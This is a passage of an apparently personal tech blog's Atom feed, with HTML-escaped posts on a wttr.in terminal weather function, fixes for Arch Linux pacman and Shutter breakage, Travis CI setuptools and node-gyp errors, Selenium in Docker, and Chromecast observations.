    curl -H "Accept-Language: ${LANG%_*}" wttr.in/"${1:-Paris}"  
}&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很適合放在 shell 的 alias 裏面  &lt;/p&gt;
&lt;p&gt;我自己是改成自訂性再高一點，&lt;br /&gt;
可以自己決定要帶什麼參數。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Weather in terminal  &lt;/span&gt;
&lt;span class="s s-Atom"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;weather&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="s s-Atom"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Accept-Language: ${LANG%_*}&amp;quot;&lt;/span&gt; &lt;span class="s s-Atom"&gt;wttr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="s s-Atom"&gt;in/&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;${1:-Taipei}?${2:-0q}&amp;quot;&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;可以拿來看月亮圓缺&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Special locations:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;moon&lt;/span&gt;                   &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;Moon&lt;/span&gt; &lt;span class="n"&gt;phase&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;US&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;France&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;these&lt;/span&gt; &lt;span class="n"&gt;cities&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;moon&lt;/span&gt;&lt;span class="mi"&gt;@2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;Moon&lt;/span&gt; &lt;span class="n"&gt;phase&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;@2016&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/blockquote&gt;
&lt;p&gt;最後這個是跟天氣比較不太相關的功能  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl wttr.in/moon&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;可以接受日期作為參數，&lt;br /&gt;
觀看不同時間的月相。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl wttr.in/moon@2017-10-20&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;關於這功能的實作在這 &lt;a href="https://github.com/chubin/pyphoon"&gt;https://github.com/chubin/pyphoon&lt;/a&gt;，&lt;br /&gt;
是用 Python 撰寫的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;p&gt;程式的輸出其實來自另外一支用 Golang 寫的 CLI 程式，&lt;br /&gt;
&lt;a href="https://github.com/schachmat/wego"&gt;https://github.com/schachmat/wego&lt;/a&gt;&lt;br /&gt;
wttr.in 主要只是把 &lt;code&gt;wego&lt;/code&gt; 和 &lt;code&gt;pyphoon&lt;/code&gt; 的輸出以 web server 的方式呈現。  &lt;/p&gt;
&lt;p&gt;然後它其實有點不太穩，&lt;br /&gt;
例如在寫這篇文章的時候，&lt;br /&gt;
大概寫了兩個半小時左右，&lt;br /&gt;
不知道為啥寫到最後 wttr.in 就掛了。&lt;code&gt;Q_Q&lt;/code&gt;&lt;br /&gt;
有興趣的人其實可以 fork 下來自己架（？&lt;br /&gt;
專案原始碼在這 &lt;a href="https://github.com/chubin/wttr.in"&gt;https://github.com/chubin/wttr.in&lt;/a&gt;。&lt;br /&gt;
用 Python 寫的，&lt;br /&gt;
Web server 用 Flask + gevent，&lt;br /&gt;
天氣的部份則是接 &lt;a href="https://developer.worldweatheronline.com/api/"&gt;WorldWeatherOnline API&lt;/a&gt; 來用。  &lt;/p&gt;</summary><category term="CLI"></category><category term="Weather"></category></entry><entry><title>pacman -Rdd gcc-multilib gcc-libs-multilib</title><link href="https://blog.m157q.tw/posts/2017/09/17/pacman-rdd-gcc-multilib-gcc-libs-multilib/" rel="alternate"></link><published>2017-09-17T17:50:32+08:00</published><updated>2017-09-17T17:50:32+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-17:posts/2017/09/17/pacman-rdd-gcc-multilib-gcc-libs-multilib/</id><summary type="html">&lt;h3&gt;Preface&lt;/h3&gt;
&lt;p&gt;If you've installed &lt;code&gt;gcc-libs-multilib&lt;/code&gt; and &lt;code&gt;gcc-multilib&lt;/code&gt; in your Arch Linux,&lt;br /&gt;
you might cannot &lt;code&gt;$ sudo pacman -Syu&lt;/code&gt; because sometimes they will conflict with &lt;code&gt;gcc-libs&lt;/code&gt; and &lt;code&gt;gcc&lt;/code&gt; in &lt;code&gt;[core]&lt;/code&gt; repository.  &lt;/p&gt;
&lt;p&gt;You have two choices:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Don't install &lt;code&gt;gcc&lt;/code&gt; and &lt;code&gt;gcc-libs&lt;/code&gt; to avoid the conflict, and wait until &lt;code&gt;gcc-multilib&lt;/code&gt; and &lt;code&gt;gcc-libs-multilib&lt;/code&gt; have new verisons.  &lt;ul&gt;
&lt;li&gt;Remove them from the list of packaged to install of this packages upgrade.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Force remove &lt;code&gt;gcc-multilib&lt;/code&gt; and &lt;code&gt;gcc-libs-multilib&lt;/code&gt; with &lt;code&gt;$ sudo pacman -Rdd gcc-multilib gcc-libs-multilib&lt;/code&gt;.  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If you do the latter, and break your &lt;code&gt;pacman&lt;/code&gt;, then this blog post may be your salvation.&lt;br /&gt;
I just encountered this situation and that's why I wrote down this blog post.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Error Message&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;pacman: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ldd &lt;span class="k"&gt;$(&lt;/span&gt;which pacman&lt;span class="k"&gt;)&lt;/span&gt;  

...  

libstdc++.so.6 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; not found  
libgcc_s.so.1 &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; not found  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These two share objects are gone which make &lt;code&gt;pacman&lt;/code&gt; broken.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;p&gt;Copy &lt;code&gt;libstdc++.so.6&lt;/code&gt; and &lt;code&gt;libgcc_s.so.1&lt;/code&gt; from other Arch Linux computer with same architecture.  &lt;/p&gt;
&lt;p&gt;If you have nothing to copy from, I've backed up these two shared objects with x86_64  architecutre below.  &lt;/p&gt;
&lt;p&gt;(If somehow you cannot download these two files or these doesn't work for you,&lt;br /&gt;
you can try the following link in the reference part.&lt;br /&gt;
Someone also backed up these two files and uploaded them in the reply of the forum thread.)  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Download these 2 share objects:  &lt;ul&gt;
&lt;li&gt;&lt;a href="/files/pacman-rdd-gcc-multilib-gcc-libs-multilib/libstdc++.so.6"&gt;libstdc++.so.6&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;sha256sum: 30c1b6ae5936f5f4afdba39f44465efc84422e957db13580e1891f081b615d0e  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="/files/pacman-rdd-gcc-multilib-gcc-libs-multilib/libgcc_s.so.1"&gt;libgcc_s.so.1&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;sha256sum: 95298eef28aca7cef5b28d8388ef0ea3721add9e7c19df74054d7b1c41bcca2e  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo mv libstdc++.so.6 libgcc_s.so.1 /usr/lib&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo pacman -S --force gcc gcc-libs&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Make sure you use &lt;code&gt;--force&lt;/code&gt; option, or pacman will complain about these two files are conflict.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/archlinux/comments/6e2no7/pacman_error_libstdcso6/"&gt;pacman error: libstdc++.so.6 : archlinux&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="pacman"></category><category term="gcc"></category><category term="gcc-libs"></category></entry><entry><title>Shutter 0.94-2 broken after Perl upgraded to 5.26 on Arch Linux</title><link href="https://blog.m157q.tw/posts/2017/09/15/shutter-0-94-2-broken-after-perl-upgraded-to-5-26-on-arch-linux/" rel="alternate"></link><published>2017-09-17T14:17:00+08:00</published><updated>2017-09-17T14:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-15:posts/2017/09/15/shutter-0-94-2-broken-after-perl-upgraded-to-5-26-on-arch-linux/</id><summary type="html">&lt;h3&gt;Error Message&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ shutter  
Can&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t locate Gnome2.pm in @INC &lt;span class="o"&gt;(&lt;/span&gt;you may need to install the Gnome2 module&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;(&lt;/span&gt;@INC contains:  
    /usr/lib/perl5/5.26/site_perl  
    /usr/share/perl5/site_perl  
    /usr/lib/perl5/5.26/vendor_perl  
    /usr/share/perl5/vendor_perl  
    /usr/lib/perl5/5.26/core_perl  
    /usr/share/perl5/core_perl  
&lt;span class="o"&gt;)&lt;/span&gt; at /usr/bin/shutter line &lt;span class="m"&gt;37&lt;/span&gt;.  
BEGIN failed--compilation aborted at /usr/bin/shutter line &lt;span class="m"&gt;37&lt;/span&gt;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ yaourt -S gnomecanvas-perl  
$ yaourt -S gnome-vfs-perl  
$ pacman -Qqo &lt;span class="s1"&gt;&amp;#39;/usr/lib/perl5/vendor_perl&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xargs yaourt -S --noconfirm  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://forum.manjaro.org/t/aur-install-packages-with-perl-broken-again/30913/9"&gt;AUR install packages with Perl broken again - Updating - Manjaro&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.archlinux.org/news/perl-library-path-change/"&gt;Arch Linux - News: Perl library path change&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="shutter"></category><category term="Perl"></category></entry><entry><title>Error: contextify@0.1.15 install: `node-gyp rebuild`</title><link href="https://blog.m157q.tw/posts/2017/09/01/error-contextify-0-1-15-install-node-gyp-rebuild/" rel="alternate"></link><published>2017-09-01T16:25:08+08:00</published><updated>2017-09-01T16:25:08+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-09-01:posts/2017/09/01/error-contextify-0-1-15-install-node-gyp-rebuild/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;Encountered this error of one build on Travis CI of some project.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;p&gt;Downgrade node to 6.11 which is LTS version can solved this problem.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- nvm install v6.11.2  
- nvm use v6.11.2  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Add these two lines into &lt;code&gt;install&lt;/code&gt; part of &lt;code&gt;.travis.yml&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blackjk3/react-form-builder/issues/11#issuecomment-319307464"&gt;https://github.com/blackjk3/react-form-builder/issues/11#issuecomment-319307464&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Node.js"></category><category term="node-gyp"></category></entry><entry><title>Selenium in Docker got "Operation not permitted" error</title><link href="https://blog.m157q.tw/posts/2017/08/28/selenium-in-docker-got-operation-not-permitted-error/" rel="alternate"></link><published>2017-09-19T12:51:40+08:00</published><updated>2017-09-19T12:51:40+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-28:posts/2017/08/28/selenium-in-docker-got-operation-not-permitted-error/</id><summary type="html">&lt;h2&gt;Solutions&lt;/h2&gt;
&lt;p&gt;Just choose one of the solutions below.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;For Docker&lt;/h4&gt;
&lt;p&gt;Add &lt;code&gt;--cap-add SYS_ADMIN&lt;/code&gt; for &lt;code&gt;docker run&lt;/code&gt; to gain the permission  &lt;/p&gt;
&lt;p&gt;For example:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker run -it &lt;span class="se"&gt;\ &lt;/span&gt; 
             --cap-add&lt;span class="o"&gt;=&lt;/span&gt;SYS_ADMIN &lt;span class="se"&gt;\ &lt;/span&gt; 
             -e &lt;span class="nv"&gt;PYTHONPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;container_work_dir&lt;span class="k"&gt;)&lt;/span&gt;  
             -p &lt;span class="k"&gt;$(&lt;/span&gt;site_port_mapping&lt;span class="k"&gt;)&lt;/span&gt;  
             -p &lt;span class="k"&gt;$(&lt;/span&gt;admin_port_mapping&lt;span class="k"&gt;)&lt;/span&gt;  
             -p &lt;span class="k"&gt;$(&lt;/span&gt;https_port_mapping&lt;span class="k"&gt;)&lt;/span&gt;  
             -w &lt;span class="k"&gt;$(&lt;/span&gt;container_work_dir&lt;span class="k"&gt;)&lt;/span&gt;  
             --name &lt;span class="k"&gt;$(&lt;/span&gt;project_name&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h4&gt;For Selenium&lt;/h4&gt;
&lt;p&gt;Add &lt;code&gt;--no-sandbox&lt;/code&gt; while launching Chrome driver  &lt;/p&gt;
&lt;p&gt;For example:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;selenium&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;webdriver&lt;/span&gt;  

&lt;span class="n"&gt;chrome_options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;webdriver&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ChromeOptions&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;chrome_options&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;--no-sandbox&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;chrome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;webdriver&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Chrome&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chrome_options&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;chrome_options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jessfraz/dockerfiles/issues/65"&gt;https://github.com/jessfraz/dockerfiles/issues/65&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/43665276/how-to-run-google-chrome-headless-in-docker"&gt;https://stackoverflow.com/questions/43665276/how-to-run-google-chrome-headless-in-docker&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jessfraz/dockerfiles/issues/17"&gt;https://github.com/jessfraz/dockerfiles/issues/17&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SeleniumHQ/docker-selenium/issues/383"&gt;https://github.com/SeleniumHQ/docker-selenium/issues/383&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/elgalu/docker-selenium/issues/58"&gt;https://github.com/elgalu/docker-selenium/issues/58&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Chatie/wechaty/commit/e68483833f85cfc59879da0daf62f275a0ef9db8"&gt;https://github.com/Chatie/wechaty/commit/e68483833f85cfc59879da0daf62f275a0ef9db8&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Docker"></category><category term="Selenium"></category></entry><entry><title>setuptools 36.2.0 upgrading/downgrading uninstall rollback error with Python 3.6.2 on Travis CI</title><link href="https://blog.m157q.tw/posts/2017/08/27/setuptools-36-2-0-upgrading-downgrading-uninstall-rollback-error-with-python-3-6-2-on-travis-ci/" rel="alternate"></link><published>2017-08-27T18:12:22+08:00</published><updated>2017-08-27T18:12:22+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-27:posts/2017/08/27/setuptools-36-2-0-upgrading-downgrading-uninstall-rollback-error-with-python-3-6-2-on-travis-ci/</id><summary type="html">&lt;blockquote&gt;
&lt;p&gt;TL;DR: Just &lt;code&gt;pip install -U setuptools&lt;/code&gt; before the package which depends on &lt;code&gt;setuptools&lt;/code&gt; upgrade it.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;A build on Travis CI of one of my side projects got error &lt;code&gt;AttributeError: 'Distribution' object has no attribute 'install_requires'&lt;/code&gt; while upgrading setuptools from 36.2.0 to 36.7.0 with Python 3.6.2 build job. This build also has Python 3.4 and Python 3.5 build jobs which have no erorr because they didn't need to upgrade &lt;code&gt;setuptools&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;What's the problem&lt;/h2&gt;
&lt;p&gt;Travis CI image with &lt;code&gt;os: linux&lt;/code&gt; and &lt;code&gt;python: 3.6&lt;/code&gt; labels default installed &lt;code&gt;Python 3.6.2&lt;/code&gt;, &lt;code&gt;pip 9.0.1&lt;/code&gt; and &lt;code&gt;setuptools 36.2.0&lt;/code&gt; in this time. The problem occured while &lt;code&gt;pip install -U pytest&lt;/code&gt; was running because the default &lt;code&gt;--upgrade-strategy&lt;/code&gt; of &lt;code&gt;-U / --upgrade&lt;/code&gt; option of &lt;code&gt;pip&lt;/code&gt; is &lt;code&gt;"eager"&lt;/code&gt; which will upgrade all dependent packages to newest version.  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;See part of &lt;code&gt;pip install -h&lt;/code&gt; for detail:&lt;br /&gt;
&lt;code&gt;-U, --upgrade               Upgrade all specified packages to the newest available version.  
                              The handling of dependencies depends on the upgrade-strategy  
                              used.  
  --upgrade-strategy &amp;lt;upgrade_strategy&amp;gt;  
                              Determines how dependency upgrading should be handled. "eager"  
                              - dependencies are upgraded regardless of whether the currently  
                              installed version satisfies the requirements of the upgraded  
                              package(s). "only-if-needed" -  are upgraded only when they do  
                              not satisfy the requirements of the upgraded package(s).&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This made &lt;code&gt;pip install -U pytest&lt;/code&gt; upgrade &lt;code&gt;setuptools&lt;/code&gt; from 36.2.0 to 36.7.0 while installing &lt;code&gt;pytest-3.2.1&lt;/code&gt; and got the error below:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Found existing installation: setuptools 36.2.0  
    Uninstalling setuptools-36.2.0:  
      Successfully uninstalled setuptools-36.2.0  
  Rolling back uninstall of setuptools  
Exception:  
Traceback (most recent call last):  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/basecommand.py&amp;quot;, line 215, in main  
    status = self.run(options, args)  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/commands/install.py&amp;quot;, line 342, in run  
    prefix=options.prefix_path,  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/req/req_set.py&amp;quot;, line 784, in install  
    **kwargs  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/req/req_install.py&amp;quot;, line 851, in install  
    self.move_wheel_files(self.source_dir, root=root, prefix=prefix)  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/req/req_install.py&amp;quot;, line 1064, in move_wheel_files  
    isolated=self.isolated,  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/wheel.py&amp;quot;, line 247, in move_wheel_files  
    prefix=prefix,  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/pip/locations.py&amp;quot;, line 140, in distutils_scheme  
    d = Distribution(dist_args)  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/setuptools/dist.py&amp;quot;, line 365, in __init__  
    self._finalize_requires()  
  File &amp;quot;/home/travis/virtualenv/python3.6.2/lib/python3.6/site-packages/setuptools/dist.py&amp;quot;, line 372, in _finalize_requires  
    if not self.install_requires:  
AttributeError: &amp;#39;Distribution&amp;#39; object has no attribute &amp;#39;install_requires&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;How to fix it&lt;/h2&gt;
&lt;p&gt;Although there are many comments on &lt;a href="https://github.com/pypa/setuptools/issues/1086"&gt;pypa/setuptools #1086&lt;/a&gt; and &lt;a href="https://github.com/pypa/setuptools/issues/1101"&gt;pypa/setuptools #1101&lt;/a&gt;, I didn't know the exact reason after I read them. But after a little digging on the GitHub, I finally got some clues.  &lt;/p&gt;
&lt;p&gt;This problem had already been fixed in &lt;a href="https://github.com/pypa/setuptools/pull/1089"&gt;pypa/setuptools #1089&lt;/a&gt;, but why I still got this problem? Because this fix is &lt;a href="https://github.com/pypa/setuptools/blob/ac7a33c84d74afd3b7453bd880943be9cb4c5787/setuptools/dist.py"&gt;in setuptools-36.2.1&lt;/a&gt; not in &lt;a href="https://github.com/pypa/setuptools/blob/1eec02038d28506a42bc45d14ef2d54b136cc8bc/setuptools/dist.py"&gt;setuptools-36.2.0&lt;/a&gt;, if you use &lt;code&gt;setuptools-36.2.0&lt;/code&gt; you will still encounter this problem.  &lt;/p&gt;
&lt;p&gt;Here's &lt;a href="https://github.com/labgrid-project/labgrid/pull/119/files"&gt;a workarond for this problem&lt;/a&gt; which is same as the TL;DR, just &lt;code&gt;pip install --upgrade setuptools&lt;/code&gt; to upgrade it.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Further Discussion&lt;/h2&gt;
&lt;p&gt;But why? why &lt;code&gt;pip install --upgrade setuptools&lt;/code&gt; works? why &lt;code&gt;pip install -U pytest&lt;/code&gt; doesn't? Aren't these two methods just remove &lt;code&gt;setuptools-36.2.0&lt;/code&gt; and install a newer &lt;code&gt;setuptools&lt;/code&gt;? According to the result, it's not.  &lt;/p&gt;
&lt;p&gt;I guess I might have to spend some time on figuring the workflow of &lt;code&gt;pip&lt;/code&gt;?  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/45307110/pip-is-rolling-back-uninstall-of-setuptools"&gt;https://stackoverflow.com/questions/45307110/pip-is-rolling-back-uninstall-of-setuptools&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/setuptools/issues/1086"&gt;https://github.com/pypa/setuptools/issues/1086&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/setuptools/issues/1101"&gt;https://github.com/pypa/setuptools/issues/1101&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pypa/setuptools/pull/1089"&gt;https://github.com/pypa/setuptools/pull/1089&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Travis CI"></category><category term="Python"></category><category term="setuptools"></category></entry><entry><title>原來 Chromecast</title><link href="https://blog.m157q.tw/posts/2017/08/15/so-this-is-chromecast/" rel="alternate"></link><published>2018-01-15T16:07:26+08:00</published><updated>2018-01-15T16:07:26+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-08-15:posts/2017/08/15/so-this-is-chromecast/</id><summary type="html">&lt;p&gt;原來 Chromecast 不支援 mkv&lt;br /&gt;
可播但沒聲音  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="https://developers.google.com/cast/docs/media#media-container-formats"&gt;https://developers.google.com/cast/docs/media#media-container-formats&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;原來 vlc 3.0.0 支援 Chromecast&lt;br /&gt;
不過目前是 nightly&lt;br /&gt;
得自己編&lt;br /&gt;
還沒試用過  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="https://www.howtogeek.com/269272/how-to-stream-from-vlc-to-your-chromecast/"&gt;https://www.howtogeek.com/269272/how-to-stream-from-vlc-to-your-chromecast/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;原來 smplayer 17.1.0 開始支援 Chromecast&lt;br /&gt;
但你得有個 Chrome 或 Chromium&lt;br /&gt;
並到 &lt;code&gt;chrome://flags&lt;/code&gt; enable &lt;code&gt;Load Media Router Component Extension&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="http://blog.smplayer.info/support-for-chromecast-in-smplayer-17-1/"&gt;http://blog.smplayer.info/support-for-chromecast-in-smplayer-17-1/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;其他抱怨&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Chromecast 一代外型設計很北七，太胖，會擋到其他 HDMI port，所以二代才拉了一條線出來。  &lt;/li&gt;
&lt;li&gt;看 Youtube 的時候畫質不能調整。  &lt;/li&gt;
&lt;li&gt;看 Youtube 過一陣子之後手機就沒辦法控制了，調音量和選時間都不會有反應。  &lt;/li&gt;
&lt;li&gt;Guest mode 沒試成功過。  &lt;/li&gt;
&lt;li&gt;還遇過用一用強制更新重開，而且還超級久。  &lt;/li&gt;
